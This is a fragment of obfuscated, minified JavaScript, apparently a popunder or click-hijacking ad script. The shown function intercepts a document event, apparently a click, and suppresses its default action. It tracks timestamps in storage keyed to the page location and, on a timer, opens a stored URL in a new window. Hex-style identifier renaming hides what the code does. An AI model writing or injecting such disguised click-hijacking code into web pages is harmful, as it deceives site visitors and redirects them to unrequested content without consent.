_0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());